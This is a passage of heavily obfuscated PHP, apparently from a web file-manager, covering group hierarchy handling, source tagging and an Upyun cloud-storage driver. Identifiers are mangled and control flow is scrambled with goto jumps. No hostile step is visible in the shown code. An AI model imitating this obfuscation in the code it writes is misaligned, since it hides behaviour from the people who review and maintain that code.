$_SERVER[¬ı§†‰ú˜¼]; $e±†…Ÿ×Å = explode($FŒ‹ğ£Æ÷[47], trim($e±†…Ÿ×Å, $FŒ‹ğ£Æ÷[47])); $e±†…Ÿ×Å = array_remove_value($e±†…Ÿ×Å, $FŒ‹ğ£Æ÷[495]); return $e±†…Ÿ×Å; } private function _listAppendParent(&$dĞê–È×½½) { goto cÆ©º×Ê‹Ö; cÆ©º×Ê‹Ö: $F¾Ñ§àÚ‘° =& $_SERVER[¬ı§†‰ú˜¼]; $d¤á©Íğ¤‰ = array(); foreach ($dĞê–È×½½ as &$eÜïÉ±’‡¯) { $d¤á©Íğ¤‰[$eÜïÉ±’‡¯[$F¾Ñ§àÚ‘°[1690]]] = $eÜïÉ±’‡¯[$F¾Ñ§àÚ‘°[28]]; $dàŞÅ¯õÂ¾ = $this->parentLevelArray($eÜïÉ±’‡¯[$F¾Ñ§àÚ‘°[485]]); foreach ($dàŞÅ¯õÂ¾ as $FÌ½ÎµÙ«) { if (!isset($d¤á©Íğ¤‰[$FÌ½ÎµÙ«])) { $d¤á©Íğ¤‰[$FÌ½ÎµÙ«] = 0; } } } goto e¤ ±ø†‘; B×¿ù¤±†: if ($GLOBALS[$F¾Ñ§àÚ‘°[483]] == $F¾Ñ§àÚ‘°[87]) { $BµÑ¿ò§”Š = !1; } foreach ($dĞê–È×½½ as &$eÜïÉ±’‡¯) { $dàŞÅ¯õÂ¾ = $this->parentLevelArray($eÜïÉ±’‡¯[$F¾Ñ§àÚ‘°[485]]); $C‡‚¸¸¼ÎÑ = $F¾Ñ§àÚ‘°[33]; foreach ($dàŞÅ¯õÂ¾ as $Fµ›¼”àİº => $FÌ½ÎµÙ«) { if ($BµÑ¿ò§”Š && $Fµ›¼”àİº == 0) { continue; } $C‡‚¸¸¼ÎÑ .= $d¤á©Íğ¤‰[$FÌ½ÎµÙ«] . $F¾Ñ§àÚ‘°[8]; } if ($dàŞÅ¯õÂ¾) { $C‡‚¸¸¼ÎÑ .= $eÜïÉ±’‡¯[$F¾Ñ§àÚ‘°[28]]; } $eÜïÉ±’‡¯[$F¾Ñ§àÚ‘°[489]] = str_replace($F¾Ñ§àÚ‘°[494], $F¾Ñ§àÚ‘°[8], $C‡‚¸¸¼ÎÑ); } unset($eÜïÉ±’‡¯); goto aªñ´’„; e¤ ±ø†‘: unset($eÜïÉ±’‡¯); foreach ($d¤á©Íğ¤‰ as $Fµ›¼”àİº => $f÷÷¤ˆĞÄ¥) { if ($f÷÷¤ˆĞÄ¥) { continue; } $d’è¥Ğƒğõ = $this->getInfoSimple($Fµ›¼”àİº); $d¤á©Íğ¤‰[$Fµ›¼”àİº] = $d’è¥Ğƒğõ[$F¾Ñ§àÚ‘°[28]]; } $BµÑ¿ò§”Š = $GLOBALS[$F¾Ñ§àÚ‘°[6]][$F¾Ñ§àÚ‘°[88]][$F¾Ñ§àÚ‘°[1782]]; goto B×¿ù¤±†; aªñ´’„: } private function _listAppendSourceRoot(&$EİÒÚ¶‰áê, $C½Ï¥†‘ˆò) { goto føÃ½šâàÁ; AßÌ±¢…÷: $D¸ò‰‹áÙõ = Model($CÔøÊë¢[798])->order($CÔøÊë¢[1784])->field($aÌá¬·ÈŞø)->where($e†Œ–Ñ–Ñ)->select(); $D¸ò‰‹áÙõ = array_to_keyvalue($D¸ò‰‹áÙõ, $CÔøÊë¢[482]); $D¸ò‰‹áÙõ = array_remove_key($D¸ò‰‹áÙõ, $CÔøÊë¢[482]); goto aéòÈ¼ÈÀŞ; føÃ½šâàÁ: $CÔøÊë¢ =& $_SERVER[¬ı§†‰ú˜¼]; $e†Œ–Ñ–Ñ = array($CÔøÊë¢[402] => SourceModel::TYPE_GROUP, $CÔøÊë¢[476] => 0, $CÔøÊë¢[482] => array($CÔøÊë¢[7], $C½Ï¥†‘ˆò)); $aÌá¬·ÈŞø = $CÔøÊë¢[1783]; goto AßÌ±¢…÷; aéòÈ¼ÈÀŞ: foreach ($EİÒÚ¶‰áê as &$Dõãå‰“”ø) { $Dõãå‰“”ø[$CÔøÊë¢[85]] = $D¸ò‰‹áÙõ[$Dõãå‰“”ø[$CÔøÊë¢[1690]]] ? $D¸ò‰‹áÙõ[$Dõãå‰“”ø[$CÔøÊë¢[1690]]] : array(); } unset($Dõãå‰“”ø); goto e‰–ğ«·Â; e‰–ğ«·Â: } protected function groupMerge($f‰‘æìÍ½…) { $f‰‘æìÍ½… = array_values(array_unique($f‰‘æìÍ½…)); $EİŸŒ’æÄ = array(); for ($AÃ¡¾¨Ø‰– = 0; $AÃ¡¾¨Ø‰– < count($f‰‘æìÍ½…); $AÃ¡¾¨Ø‰–++) { $F‹¥–Ÿ×†Ä = !1; for ($CÆ½ÎÉŒÍØ = 0; $CÆ½ÎÉŒÍØ < count($f‰‘æìÍ½…); $CÆ½ÎÉŒÍØ++) { if ($AÃ¡¾¨Ø‰– == $CÆ½ÎÉŒÍØ) { continue; } if ($this->isParentOf($f‰‘æìÍ½…[$CÆ½ÎÉŒÍØ], $f‰‘æìÍ½…[$AÃ¡¾¨Ø‰–])) { $F‹¥–Ÿ×†Ä = !0; break; } } if (!$F‹¥–Ÿ×†Ä) { $EİŸŒ’æÄ[] = $f‰‘æìÍ½…[$AÃ¡¾¨Ø‰–]; } } return $EİŸŒ’æÄ; } protected function isParentOf($EÂÕ÷ÆŠ‘Ş, $Cè©…¡«À) { goto dïïâ¡¬ÔÏ; Eöïœ‡«™š: $eÇã¿ìˆ©Ğ = $this->getInfoSimple($Cè©…¡«À); $AÀ˜ÎÓÏñî = $d¨˜ª–ñÚ[$CÒ›«‹âÂ[485]] . $EÂÕ÷ÆŠ‘Ş . $CÒ›«‹âÂ[47]; if (substr($eÇã¿ìˆ©Ğ[$CÒ›«‹âÂ[485]], 0, strlen($AÀ˜ÎÓÏñî)) == $AÀ˜ÎÓÏñî) { return !0; } goto BÍ¿óŸÎ‡Ç; dïïâ¡¬ÔÏ: $CÒ›«‹âÂ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$EÂÕ÷ÆŠ‘Ş || !$Cè©…¡«À || $EÂÕ÷ÆŠ‘Ş == $Cè©…¡«À) { return !1; } $d¨˜ª–ñÚ = $this->getInfoSimple($EÂÕ÷ÆŠ‘Ş); goto Eöïœ‡«™š; BÍ¿óŸÎ‡Ç: return !1; goto FŸ‰µø±Œ; FŸ‰µø±Œ: } public function groupShowRoot($DÏççÉ¯ÁÒ, $b¾Şİåô = false) { goto e›ÇÆÙ´ñƒ; a÷‡¦ÓéÊÊ: $E‘™èÅ’éÓ = $this->parentLevelArray($CÃ²Ø»Â˜ğ[$DíÚÁŠšÀ[485]]); $A»Áïñê = array($DÏççÉ¯ÁÒ); if (count($E‘™èÅ’éÓ) == 0) { return $A»Áïñê; } goto b”¨õÏšÔ; e›ÇÆÙ´ñƒ: $DíÚÁŠšÀ =& $_SERVER[¬ı§†‰ú˜¼]; $CÃ²Ø»Â˜ğ = $this->getInfo($DÏççÉ¯ÁÒ); if (!$CÃ²Ø»Â˜ğ) { return array(); } goto a÷‡¦ÓéÊÊ; b”¨õÏšÔ: if ($b¾Şİåô && count($E‘™èÅ’éÓ) == 1) { return $A»Áïñê; } if (!$CÃ²Ø»Â˜ğ[$DíÚÁŠšÀ[443]] || !isset($CÃ²Ø»Â˜ğ[$DíÚÁŠšÀ[443]][$DíÚÁŠšÀ[1766]]) || $CÃ²Ø»Â˜ğ[$DíÚÁŠšÀ[443]][$DíÚÁŠšÀ[1766]] == $DíÚÁŠšÀ[1740]) { return $this->groupShowRoot($E‘™èÅ’éÓ[count($E‘™èÅ’éÓ) - 1], $b¾Şİåô); } if ($CÃ²Ø»Â˜ğ[$DíÚÁŠšÀ[443]][$DíÚÁŠšÀ[1766]] == $DíÚÁŠšÀ[356]) { $CÂ‹ŠÛ‘ç˜ = explode($DíÚÁŠšÀ[47], $CÃ²Ø»Â˜ğ[$DíÚÁŠšÀ[443]][$DíÚÁŠšÀ[1767]]); if ($CÂ‹ŠÛ‘ç˜) { $A»Áïñê = array_merge($A»Áïñê, $CÂ‹ŠÛ‘ç˜); } } goto F´ğÀ†; F´ğÀ†: return $A»Áïñê; goto F©Î‰£‰â; F©Î‰£‰â: } protected function resetParentLevel() { $bø¢¦èé =& $_SERVER[¬ı§†‰ú˜¼]; $EÖóå¶ø•  = $bø¢¦èé[1690]; $DÂß…·¹áé = $this->select(); $DÂß…·¹áé = array_to_keyvalue($DÂß…·¹áé, $EÖóå¶ø• ); foreach ($DÂß…·¹áé as $BÒ’öŠ²ÏÔ) { goto c……ªØ‚Í¯; eéÓ¹®óèÌ: $F‚œŠ¥Œ²[] = 0; $F‚œŠ¥Œ² = $bø¢¦èé[47] . implode($bø¢¦èé[47], array_reverse($F‚œŠ¥Œ²)) . $bø¢¦èé[47]; $this->setNamePinyin($BÒ’öŠ²ÏÔ[$EÖóå¶ø• ], $BÒ’öŠ²ÏÔ[$bø¢¦èé[28]]); goto Dáù÷¦Ñ¹İ; Dáù÷¦Ñ¹İ: $this->where(array($EÖóå¶ø•  => $BÒ’öŠ²ÏÔ[$EÖóå¶ø• ]))->save(array($bø¢¦èé[552] => $F‚œŠ¥Œ²)); goto fë‹¥ó›ç; c……ªØ‚Í¯: $e©øÛ²´Ùê = $BÒ’öŠ²ÏÔ; $F‚œŠ¥Œ² = array(); while ($e©øÛ²´Ùê[$bø¢¦èé[476]] != 0) { $F‚œŠ¥Œ²[] = $e©øÛ²´Ùê[$bø¢¦èé[476]]; $e©øÛ²´Ùê = $DÂß…·¹áé[$e©øÛ²´Ùê[$bø¢¦èé[476]]]; } goto eéÓ¹®óèÌ; fë‹¥ó›ç: } return $DÂß…·¹áé; } public function groupNameAuto($bîÂ’¥À»‚, $Dë——“”´§) { $aç‹æ¯Üœé =& $_SERVER[¬ı§†‰ú˜¼]; $bì¼Óº«ö = $this->where(array($aç‹æ¯Üœé[393] => $bîÂ’¥À»‚))->getField($aç‹æ¯Üœé[28], !0); if (!$bì¼Óº«ö || !in_array($Dë——“”´§, $bì¼Óº«ö)) { return $Dë——“”´§; } for ($Bñ‰‰Ã“ä… = 1; $Bñ‰‰Ã“ä… <= count($bì¼Óº«ö) + 1; $Bñ‰‰Ã“ä…++) { $aØ™±ò İ = $Dë——“”´§ . "\x28{$Bñ‰‰Ã“ä…}\x29"; if (!in_array($aØ™±ò İ, $bì¼Óº«ö)) { return $aØ™±ò İ; } } } public function groupSwitch($bïÓ†Æ‡øˆ, $E¦ÃÂ”Ëã±) { goto E§œæîÍ‰¼; dÃãÔÅ: $a´àë±›º” = array_to_keyvalue($a´àë±›º”, $FÂ½Ó¹»ñ†[1690]); if (!isset($a´àë±›º”[$bïÓ†Æ‡øˆ]) || !isset($a´àë±›º”[$E¦ÃÂ”Ëã±]) || $a´àë±›º”[$bïÓ†Æ‡øˆ][$FÂ½Ó¹»ñ†[476]] == 0) { return !1; } $dµÌ÷ø˜¤ = array($FÂ½Ó¹»ñ†[1690] => $bïÓ†Æ‡øˆ); goto Dœº½ ğÜ÷; FƒÖ¢ì¼«ö: $this->where(array($FÂ½Ó¹»ñ†[476] => $bïÓ†Æ‡øˆ))->save(array($FÂ½Ó¹»ñ†[476] => $E¦ÃÂ”Ëã±)); return !0; goto E«ÂŠõäøî; aóŠÇ¼É¬¶: $a«ÁÄ‹ˆŸ = !empty($e´µÉ§Õá[$bïÓ†Æ‡øˆ]) ? $e´µÉ§Õá[$bïÓ†Æ‡øˆ] : !1; if ($a«ÁÄ‹ˆŸ) { goto BèÛ¢î¨ò¿; B‘“”ğ”ŞÒ: $e´µÉ§Õá = Model($FÂ½Ó¹»ñ†[798])->where($dµÌ÷ø˜¤)->field($FÂ½Ó¹»ñ†[1787])->select(); if (!$e´µÉ§Õá) { $e´µÉ§Õá = array(); } Model($FÂ½Ó¹»ñ†[798])->moveClearAuth = !1; goto EßÉñ­…ƒÕ; BèÛ¢î¨ò¿: if (!$e´µÉ§Õá[$E¦ÃÂ”Ëã±]) { $e´µÉ§Õá[$E¦ÃÂ”Ëã±] = Model($FÂ½Ó¹»ñ†[798])->groupRootAdd($E¦ÃÂ”Ëã±); } $EÕ­Âèë‰Å = $e´µÉ§Õá[$E¦ÃÂ”Ëã±]; $dµÌ÷ø˜¤ = array($FÂ½Ó¹»ñ†[476] => $a«ÁÄ‹ˆŸ); goto B‘“”ğ”ŞÒ; EßÉñ­…ƒÕ: foreach ($e´µÉ§Õá as $cßß…˜Â¡ ) { $Få‡£š¤Â‚ = $cßß…˜Â¡ [$FÂ½Ó¹»ñ†[401]] == $FÂ½Ó¹»ñ†[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($FÂ½Ó¹»ñ†[798])->move($cßß…˜Â¡ [$FÂ½Ó¹»ñ†[394]], $EÕ­Âèë‰Å, $Få‡£š¤Â‚); } Model($FÂ½Ó¹»ñ†[798])->moveClearAuth = !0; $dµÌ÷ø˜¤ = array($FÂ½Ó¹»ñ†[402] => 2, $FÂ½Ó¹»ñ†[482] => $bïÓ†Æ‡øˆ); goto e†éùö†·™; e†éùö†·™: $d›ÄÜ®ÍÜ = array($FÂ½Ó¹»ñ†[482] => $E¦ÃÂ”Ëã±); Model($FÂ½Ó¹»ñ†[1788])->where($dµÌ÷ø˜¤)->save($d›ÄÜ®ÍÜ); Model($FÂ½Ó¹»ñ†[1789])->where($dµÌ÷ø˜¤)->save($d›ÄÜ®ÍÜ); goto A¼ÍÑò¥„º; A¼ÍÑò¥„º: } $this->_changeChildLevel($a´àë±›º”[$bïÓ†Æ‡øˆ], $a´àë±›º”[$E¦ÃÂ”Ëã±], !0); goto FƒÖ¢ì¼«ö; Dœº½ ğÜ÷: $e†ùç¬…äÅ = Model($FÂ½Ó¹»ñ†[1771])->where($dµÌ÷ø˜¤)->select(); if (!$e†ùç¬…äÅ) { $e†ùç¬…äÅ = array(); } foreach ($e†ùç¬…äÅ as $aˆß™Á—) { $c×ŞÂÓ»© = $aˆß™Á—[$FÂ½Ó¹»ñ†[1527]]; $dµÌ÷ø˜¤ = array($FÂ½Ó¹»ñ†[1527] => $c×ŞÂÓ»©, $FÂ½Ó¹»ñ†[1690] => $E¦ÃÂ”Ëã±); $dÊ¤²´²ì = Model($FÂ½Ó¹»ñ†[1771])->where($dµÌ÷ø˜¤)->find(); if (!$dÊ¤²´²ì) { $cÁ½ˆæ¤­ = array($E¦ÃÂ”Ëã± => $aˆß™Á—[$FÂ½Ó¹»ñ†[1785]]); Model($FÂ½Ó¹»ñ†[505])->userGroupAdd($c×ŞÂÓ»©, $cÁ½ˆæ¤­); } Model($FÂ½Ó¹»ñ†[505])->userGroupRemove($c×ŞÂÓ»©, $bïÓ†Æ‡øˆ); } goto D«¯¥Ï¹š; E§œæîÍ‰¼: $FÂ½Ó¹»ñ† =& $_SERVER[¬ı§†‰ú˜¼]; $dµÌ÷ø˜¤ = array($FÂ½Ó¹»ñ†[1690] => array($FÂ½Ó¹»ñ†[7], array($bïÓ†Æ‡øˆ, $E¦ÃÂ”Ëã±))); $a´àë±›º” = $this->where($dµÌ÷ø˜¤)->select(); goto dÃãÔÅ; D«¯¥Ï¹š: $dµÌ÷ø˜¤ = array($FÂ½Ó¹»ñ†[402] => 2, $FÂ½Ó¹»ñ†[476] => 0, $FÂ½Ó¹»ñ†[401] => 1, $FÂ½Ó¹»ñ†[482] => array($FÂ½Ó¹»ñ†[7], array($bïÓ†Æ‡øˆ, $E¦ÃÂ”Ëã±))); $e´µÉ§Õá = Model($FÂ½Ó¹»ñ†[798])->where($dµÌ÷ø˜¤)->field($FÂ½Ó¹»ñ†[1786])->select(); $e´µÉ§Õá = array_to_keyvalue($e´µÉ§Õá, $FÂ½Ó¹»ñ†[482], $FÂ½Ó¹»ñ†[394]); goto aóŠÇ¼É¬¶; E«ÂŠõäøî: } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($f²’“Ù¸Î) { $bÍñÏ»¬Íõ =& $_SERVER[¬ı§†‰ú˜¼]; return array($bÍñÏ»¬Íõ[1790] => array($f²’“Ù¸Î[0], $bÍñÏ»¬Íõ[1791]), $bÍñÏ»¬Íõ[1792] => array($f²’“Ù¸Î[0], $bÍñÏ»¬Íõ[1793])); } protected function get($f„¤­ó¿Ÿ¦) { $e¼ÕğàÎµÜ =& $_SERVER[¬ı§†‰ú˜¼]; $C¡É··Øò• = Model($e¼ÕğàÎµÜ[484])->metaGet($f„¤­ó¿Ÿ¦, $e¼ÕğàÎµÜ[1794]); $aô¬¶ø£‰ = json_decode($C¡É··Øò•, !0); return $aô¬¶ø£‰ ? $aô¬¶ø£‰ : array($e¼ÕğàÎµÜ[1795] => $e¼ÕğàÎµÜ[87], $e¼ÕğàÎµÜ[366] => array()); } protected function set($BÆâŠòÖÎÛ, $D„ˆïŒÕî´) { $CÑºŸ…İ›ò =& $_SERVER[¬ı§†‰ú˜¼]; $D„ˆïŒÕî´ = $D„ˆïŒÕî´ ? $D„ˆïŒÕî´ : array($CÑºŸ…İ›ò[1795] => $CÑºŸ…İ›ò[87], $CÑºŸ…İ›ò[366] => array()); Model($CÑºŸ…İ›ò[484])->metaSet($BÆâŠòÖÎÛ, $CÑºŸ…İ›ò[1794], json_encode($D„ˆïŒÕî´)); return Model($CÑºŸ…İ›ò[484])->metaSet($BÆâŠòÖÎÛ, $CÑºŸ…İ›ò[1794], json_encode($D„ˆïŒÕî´)); } protected function getByTagID($BÚ£Ç‹’á, $FÛæÚÃ„­) { goto d“¤³Š Á‰; eÚÃ„ò™: return is_array($B¬İºµˆš) ? $B¬İºµˆš : !1; goto a¥Áƒ¾”­™; d“¤³Š Á‰: $CÁí´Ûâ¤å =& $_SERVER[¬ı§†‰ú˜¼]; if (!$BÚ£Ç‹’á || !$FÛæÚÃ„­) { return !1; } if (!Model($CÁí´Ûâ¤å[484])->getInfoSimple($BÚ£Ç‹’á)) { return !1; } goto aæ´ ¥Œ; aæ´ ¥Œ: $fÃå¢šã±ß = $this->get($BÚ£Ç‹’á); if (!$fÃå¢šã±ß || !isset($fÃå¢šã±ß[$CÁí´Ûâ¤å[366]])) { return !1; } $B¬İºµˆš = array_find_by_field($fÃå¢šã±ß[$CÁí´Ûâ¤å[366]], $CÁí´Ûâ¤å[392], $FÛæÚÃ„­); goto eÚÃ„ò™; a¥Áƒ¾”­™: } public function listSource($cãöŸÈåÍ±, $C†ğ…Ş£ø) { goto bÄˆ†Òİ£; dŞŸÂÂ¢ª: $eÄãøÈ¼É = array(); foreach ($E¢‰Ñ“­‘ as $C¤§ñš¾·È) { $có¬¦Ë·Ã« = $C¤§ñš¾·È[$bÇ°İŠ†—[76]]; if (!$có¬¦Ë·Ã«) { continue; } if (!isset($eÄãøÈ¼É[$có¬¦Ë·Ã«])) { $eÄãøÈ¼É[$có¬¦Ë·Ã«] = array(); } $eÄãøÈ¼É[$có¬¦Ë·Ã«][] = $C¤§ñš¾·È[$bÇ°İŠ†—[417]]; } $Cà²–‰± = array(); goto EŒ¢·µ§Œß; bÄˆ†Òİ£: $bÇ°İŠ†— =& $_SERVER[¬ı§†‰ú˜¼]; if ($C†ğ…Ş£ø && !is_array($C†ğ…Ş£ø)) { $C†ğ…Ş£ø = array($C†ğ…Ş£ø); } $E¢‰Ñ“­‘ = $this->listData($cãöŸÈåÍ±); goto dŞŸÂÂ¢ª; EŒ¢·µ§Œß: foreach ($eÄãøÈ¼É as $Fóñ¬­ë => $Díâè˜›¶Ô) { $bö×°¨¨Õ½ = !0; if (!$C†ğ…Ş£ø) { $Cà²–‰±[] = $Fóñ¬­ë; continue; } foreach ($C†ğ…Ş£ø as $C…±Ñ™Ñ) { if (!in_array($C…±Ñ™Ñ, $Díâè˜›¶Ô)) { $bö×°¨¨Õ½ = !1; break; } } if ($bö×°¨¨Õ½) { $Cà²–‰±[] = $Fóñ¬­ë; } } if (!$Cà²–‰±) { return array(); } $DÖÈ­†ò¼† = Model($bÇ°İŠ†—[1204])->listSource(array($bÇ°İŠ†—[408] => array($bÇ°İŠ†—[409], $Cà²–‰±))); goto D®…ó´Œ›ë; dÕâŒêöÌ: $F™ÎÖéîáÈ = array_to_keyvalue($DÖÈ­†ò¼†[$bÇ°İŠ†—[74]], $bÇ°İŠ†—[33], $bÇ°İŠ†—[394]); $Eö˜â»øâã = array_merge($F™ÎÖéîáÈ, $Dã“‰Ã±Šñ); foreach ($Cà²–‰± as $có¬¦Ë·Ã«) { if (!in_array($có¬¦Ë·Ã«, $Eö˜â»øâã)) { $f”ŠÕÀÃ¬[] = $có¬¦Ë·Ã«; } } goto b¹Ú÷ÜåÒè; b¹Ú÷ÜåÒè: if ($f”ŠÕÀÃ¬) { $this->removeBySource($cãöŸÈåÍ±, $f”ŠÕÀÃ¬); } return $DÖÈ­†ò¼†; goto Aæ»¦Ù‰ŸÁ; D®…ó´Œ›ë: if (!$DÖÈ­†ò¼† || count($Cà²–‰±) == $DÖÈ­†ò¼†[$bÇ°İŠ†—[363]][$bÇ°İŠ†—[364]]) { return $DÖÈ­†ò¼†; } $f”ŠÕÀÃ¬ = array(); $Dã“‰Ã±Šñ = array_to_keyvalue($DÖÈ­†ò¼†[$bÇ°İŠ†—[75]], $bÇ°İŠ†—[33], $bÇ°İŠ†—[394]); goto dÕâŒêöÌ; Aæ»¦Ù‰ŸÁ: } protected function listData($A‡éÂ¯êÆƒ) { $Fº‡§„ÏŞ =& $_SERVER[¬ı§†‰ú˜¼]; $a—ˆó®È¥ = array($Fº‡§„ÏŞ[1519] => 0, $Fº‡§„ÏŞ[461] => array($Fº‡§„ÏŞ[1796], 0), $Fº‡§„ÏŞ[413] => $Fº‡§„ÏŞ[1797] . $A‡éÂ¯êÆƒ); $aŞ˜ë¿× = $Fº‡§„ÏŞ[1798]; $dÊäèĞ = $this->field($aŞ˜ë¿×)->where($a—ˆó®È¥)->order($Fº‡§„ÏŞ[1799])->select(); return $dÊäèĞ ? $dÊäèĞ : array(); } protected function addToTag($eå´…Ÿï „, $C©¤£çÓò», $CºÌªÌšîŒ) { $cñéÅ‚ÇÃ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->getByTagID($eå´…Ÿï „, $CºÌªÌšîŒ) || !$C©¤£çÓò») { return !1; } if (!Model($cñéÅ‚ÇÃ[798])->pathInfo($C©¤£çÓò»)) { return !1; } $eŞÁ’Š­›¯ = array($cñéÅ‚ÇÃ[1519] => 0, $cñéÅ‚ÇÃ[461] => $CºÌªÌšîŒ, $cñéÅ‚ÇÃ[412] => $C©¤£çÓò», $cñéÅ‚ÇÃ[413] => $cñéÅ‚ÇÃ[1800] . $eå´…Ÿï „, $cñéÅ‚ÇÃ[411] => $cñéÅ‚ÇÃ[33], $cñéÅ‚ÇÃ[1694] => 0); if ($this->where($eŞÁ’Š­›¯)->find()) { return !1; } return $this->add($eŞÁ’Š­›¯); } protected function removeFromTag($Eß†¾ƒÌí, $eˆ®ƒÜˆ†Õ, $c©ÊÌ¶—¯) { $Eô–íçĞ® =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->getByTagID($Eß†¾ƒÌí, $c©ÊÌ¶—¯) || !$eˆ®ƒÜˆ†Õ) { return !1; } if (is_array($eˆ®ƒÜˆ†Õ)) { $eˆ®ƒÜˆ†Õ = array($Eô–íçĞ®[7], $eˆ®ƒÜˆ†Õ); } $bÇ‘‘Ş´¾¦ = array($Eô–íçĞ®[1519] => 0, $Eô–íçĞ®[461] => $c©ÊÌ¶—¯, $Eô–íçĞ®[413] => $Eô–íçĞ®[1800] . $Eß†¾ƒÌí, $Eô–íçĞ®[412] => $eˆ®ƒÜˆ†Õ); return $this->where($bÇ‘‘Ş´¾¦)->delete(); } protected function removeByTag($DãÅˆ´”„, $BÄ«…¯ØÕ) { $dİÂÃå™Ã =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->getByTagID($DãÅˆ´”„, $BÄ«…¯ØÕ)) { return !1; } $E‹¹‚Æà£ˆ = array($dİÂÃå™Ã[1519] => 0, $dİÂÃå™Ã[461] => $BÄ«…¯ØÕ, $dİÂÃå™Ã[413] => $dİÂÃå™Ã[1800] . $DãÅˆ´”„); return $this->where($E‹¹‚Æà£ˆ)->delete(); } protected function removeBySource($FÏÉß¤“ƒ, $EŠÌ’Š”­ê) { $BÆÈ­ÇÏ‹ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$FÏÉß¤“ƒ || !$EŠÌ’Š”­ê) { return !1; } if (is_array($EŠÌ’Š”­ê)) { $EŠÌ’Š”­ê = array($BÆÈ­ÇÏ‹[7], $EŠÌ’Š”­ê); } $AØâ±—ÖÌ = array($BÆÈ­ÇÏ‹[1519] => 0, $BÆÈ­ÇÏ‹[412] => $EŠÌ’Š”­ê, $BÆÈ­ÇÏ‹[461] => array($BÆÈ­ÇÏ‹[970], 0), $BÆÈ­ÇÏ‹[413] => $BÆÈ­ÇÏ‹[1800] . $FÏÉß¤“ƒ); return $this->where($AØâ±—ÖÌ)->delete(); } } goto Bù¾†Èê¶è; b·Ğ±ğÕ¶: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\x70\x3a\57\x2f\166\x30\56\x61\x70\x69\x2e\165\160\171\x75\156\56\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($DÙƒ†óÀåÌ) { parent::__construct(); $this->_init($DÙƒ†óÀåÌ); } public function _init($fÏ¬¸……›) { $F“ïß•Öàå =& $_SERVER[¬ı§†‰ú˜¼]; foreach ($fÏ¬¸……› as $dõ›ÓãÊÈ => $cÑõŠ§¿™•) { if (isset($this->{$dõ›ÓãÊÈ})) { $this->{$dõ›ÓãÊÈ} = $cÑõŠ§¿™•; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($F“ïß•Öàå[1328] . LNG($F“ïß•Öàå[1260])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Fµ²Îõ×¢¦, $e„…¢Šœ¯ò = "\107\x45\124") { $fÅ–†ÄÜ° =& $_SERVER[¬ı§†‰ú˜¼]; $e‚ÃÍòêŸî = gmdate($fÅ–†ÄÜ°[1294]); $DñÛë¡äÕ² = base64_encode(hash_hmac($fÅ–†ÄÜ°[1329], "{$e„…¢Šœ¯ò}\46{$Fµ²Îõ×¢¦}\46{$e‚ÃÍòêŸî}", md5("{$this->userpass}"), !0)); $Fá´¾áËˆ = array("\x41\x75\x74\x68\157\x72\x69\x7a\x61\x74\151\157\156\72\125\x50\131\125\x4e\40{$this->username}\72{$DñÛë¡äÕ²}", "\104\x61\164\145\72{$e‚ÃÍòêŸî}"); return $Fá´¾áËˆ; } public function ussRequest($E‹ó»Ô·Òõ, $CçÑ†Ü¯Œ¤ = "\107\105\x54", $e¥ÁîëÍÛ = false, $BÒ“é¥Œö = false, $a£ÚŠÕÇ¾ = false) { goto BŒçŒ°ƒš†; BŒçŒ°ƒš†: $A¸ÛÑµ›©‚ =& $_SERVER[¬ı§†‰ú˜¼]; $E‹ó»Ô·Òõ = trim($E‹ó»Ô·Òõ, $A¸ÛÑµ›©‚[8]); $eŞ¨—ŞŠô = "\x2f{$this->bucket}\57{$E‹ó»Ô·Òõ}"; goto E…›œÚÑæ¸; Eö¥á‹„á: if (!$a‹³ÜÕ†ô) { return array($A¸ÛÑµ›©‚[1085] => !1, $A¸ÛÑµ›©‚[1087] => $A¸ÛÑµ›©‚[1330]); } if (strtolower($CçÑ†Ü¯Œ¤) == $A¸ÛÑµ›©‚[190] || in_array($a‹³ÜÕ†ô[$A¸ÛÑµ›©‚[1085]], array($A¸ÛÑµ›©‚[1187], $A¸ÛÑµ›©‚[1331]))) { $e¥ÁîëÍÛ = $a‹³ÜÕ†ô[$A¸ÛÑµ›©‚[1332]]; } else { $e¥ÁîëÍÛ = json_decode($a‹³ÜÕ†ô[$A¸ÛÑµ›©‚[1087]], !0); if (!$e¥ÁîëÍÛ) { $e¥ÁîëÍÛ = $a‹³ÜÕ†ô[$A¸ÛÑµ›©‚[1087]]; } else { if (!$a‹³ÜÕ†ô[$A¸ÛÑµ›©‚[714]] && isset($e¥ÁîëÍÛ[$A¸ÛÑµ›©‚[1333]])) { $e¥ÁîëÍÛ = $e¥ÁîëÍÛ[$A¸ÛÑµ›©‚[1333]]; } } } return array($A¸ÛÑµ›©‚[1085] => $a‹³ÜÕ†ô[$A¸ÛÑµ›©‚[714]], $A¸ÛÑµ›©‚[1087] => $e¥ÁîëÍÛ); goto F©Æ‡ŞóÛ; E…›œÚÑæ¸: $eù˜è¹‹Å = $this->ussHeaders($eŞ¨—ŞŠô, $CçÑ†Ü¯Œ¤); if ($BÒ“é¥Œö) { $eù˜è¹‹Å = array_merge($eù˜è¹‹Å, $BÒ“é¥Œö); } $a‹³ÜÕ†ô = url_request($this->endpoint . $eŞ¨—ŞŠô, $CçÑ†Ü¯Œ¤, $e¥ÁîëÍÛ, $eù˜è¹‹Å, $a£ÚŠÕÇ¾); goto Eö¥á‹„á; F©Æ‡ŞóÛ: } public function mkfile($d•¥¤Ú¤ê, $D…ùˆ‡ÑÅÚ = '', $Aî²¶Ú¥ö² = REPEAT_RENAME) { if ($this->setContent($d•¥¤Ú¤ê, $D…ùˆ‡ÑÅÚ)) { return $this->getPathOuter($d•¥¤Ú¤ê); } return !1; } public function mkdir($b¾İ±ãİÕÄ, $b÷ãíª¸¸ = REPEAT_SKIP) { $a°˜šÉÂ°… =& $_SERVER[¬ı§†‰ú˜¼]; $CíÆë›Šà• = trim($b¾İ±ãİÕÄ, 